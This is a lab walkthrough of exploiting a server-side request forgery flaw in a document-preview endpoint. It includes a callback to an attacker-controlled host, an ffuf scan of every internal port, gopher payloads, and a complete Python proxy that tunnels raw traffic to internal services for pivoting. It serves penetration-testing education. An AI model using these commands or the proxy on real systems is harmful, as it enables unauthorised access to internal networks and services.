# SSRF → Internal Service Discovery → Gopher Tunneling Lab

## Overview

This lab demonstrates how a seemingly simple **Server-Side Request Forgery (SSRF)** vulnerability can be leveraged to discover and interact with **internal services that are not externally accessible**.

Attack chain:

```
SSRF
↓
Internal Port Scanning
↓
Hidden Service Discovery
↓
Gopher Payload Tunneling
↓
Internal Service Interaction
```

This technique is commonly used in penetration testing and Capture The Flag (CTF) environments.

---

# Target Application

The vulnerable endpoint:

```
/preview.php?url=
```

Example request:

```
http://TARGET/preview.php?url=http://cvssm1/pdf/lorem.pdf
```

The server fetches a remote resource and displays it in a document preview.

Likely backend logic:

```php
$content = file_get_contents($_GET['url']);
echo $content;
```

This allows attackers to force the server to make arbitrary HTTP requests.

---

# Step 1 – Initial Enumeration

The application presents a simple interface simulating an **Online Library**.

Available documents:

```
Dummy
Lorem
```

Clicking a document loads a preview via the vulnerable endpoint.

Example:

```
http://TARGET/preview.php?url=http://cvssm1/pdf/lorem.pdf
```

Observation:

* The server retrieves the file from a remote URL.
* The content is rendered in a PDF viewer.

This suggests a potential **SSRF vulnerability**.

---

# Step 2 – Confirming SSRF

Start a local HTTP server:

```bash
python3 -m http.server 8000
```

Then trigger the endpoint:

```
http://TARGET/preview.php?url=http://ATTACKER_IP:8000/test
```

If the request appears in the attacker server logs:

```
TARGET_IP - - "GET /test HTTP/1.1"
```

The SSRF vulnerability is confirmed.

---

# Step 3 – Testing Internal Access

Once SSRF is confirmed, attempt requests to internal services.

Examples:

```
http://TARGET/preview.php?url=http://127.0.0.1
```

```
http://TARGET/preview.php?url=http://localhost
```

```
http://TARGET/preview.php?url=http://cvssm1
```

These requests may return the same application page, indicating the server can access internal hosts.

---

# Step 4 – Internal Port Scanning via SSRF

Since the server can reach localhost, we can perform **internal port scanning**.

Using ffuf:

```bash
ffuf -u "http://TARGET/preview.php?url=http://127.0.0.1:FUZZ" \
-w <(seq 1 65535) \
-mc all \
-t 100 \
-fs 0
```

Explanation:

| Parameter   | Description            |
| ----------- | ---------------------- |
| FUZZ        | Port number            |
| seq 1 65535 | Scan all TCP ports     |
| -fs 0       | Filter empty responses |
| -t 100      | Concurrent threads     |

Example discovery:

```
127.0.0.1:10000
```

This indicates a service running internally.

---

# Step 5 – The Interaction Problem

The SSRF endpoint allows simple HTTP requests, but interacting with services typically requires **full HTTP requests**.

Example:

```
GET / HTTP/1.1
Host: 127.0.0.1
```

Standard SSRF cannot easily craft such raw requests.

---

# Step 6 – Using Gopher for Raw Requests

The **gopher protocol** allows sending raw TCP data.

Example payload:

```
gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1
```

This sends:

```
GET / HTTP/1.1
```

to the internal service.

However, manually crafting these payloads is cumbersome.

---

# Step 7 – Building an SSRF Proxy

To simplify interaction with internal services, we can build a **local proxy** that automatically converts requests into SSRF gopher payloads.

Proxy script:

```python
#!/usr/bin/env python3
import socket
import requests
import urllib.parse
import threading
import argparse

def handle_client(conn, addr, target_host, host_to_proxy, port_to_proxy):
    with conn:
        data = conn.recv(65536)
        if not data:
            return

        double_encoded_data = urllib.parse.quote(
            urllib.parse.quote(data)
        )

        target_url = (
            f"http://{target_host}/preview.php?url="
            f"gopher://{host_to_proxy}:{port_to_proxy}/_{double_encoded_data}"
        )

        try:
            resp = requests.get(target_url, timeout=10)
            conn.sendall(resp.content)
        except Exception as e:
            print(f"Proxy error: {e}")
            conn.sendall(b"Proxy error")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--lhost", required=True)
    parser.add_argument("--lport", type=int, required=True)
    parser.add_argument("--target", required=True)
    parser.add_argument("--phost", required=True)
    parser.add_argument("--pport", type=int, required=True)

    args = parser.parse_args()

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((args.lhost, args.lport))
        s.listen()

        print(f"Listening on {args.lhost}:{args.lport}")

        while True:
            conn, addr = s.accept()

            thread = threading.Thread(
                target=handle_client,
                args=(conn, addr, args.target, args.phost, args.pport),
                daemon=True
            )
            thread.start()

if __name__ == "__main__":
    main()
```

---

# Step 8 – Accessing Internal Services

Start the proxy:

```
python3 proxy.py \
--lhost 127.0.0.1 \
--lport 4002 \
--target TARGET_HOST \
--phost 127.0.0.1 \
--pport 10000
```

Now any request sent to:

```
127.0.0.1:4002
```

will be forwarded to:

```
127.0.0.1:10000 (inside the target server)
```

via SSRF + gopher.

This effectively creates an **SSRF tunnel**.

---

# Step 9 – Pivoting to Other Services

The same technique can be used for different internal ports.

Example:

```
python3 proxy.py \
--lhost 127.0.0.1 \
--lport 4002 \
--target TARGET_HOST \
--phost 127.0.0.1 \
--pport 80
```

This allows interaction with the target's internal web server.

---

# Key Takeaways

This lab demonstrates several important concepts:

• Identifying SSRF vulnerabilities
• Confirming SSRF with attacker-controlled servers
• Using SSRF to enumerate internal services
• Performing internal port scanning with ffuf
• Leveraging the gopher protocol for raw request injection
• Building an SSRF proxy to interact with internal services

These techniques are frequently used in advanced web exploitation scenarios.

---

# Skills Practiced

* Web application enumeration
* SSRF exploitation
* Internal network discovery
* Port scanning techniques
* HTTP protocol understanding
* Proxy tunneling via SSRF

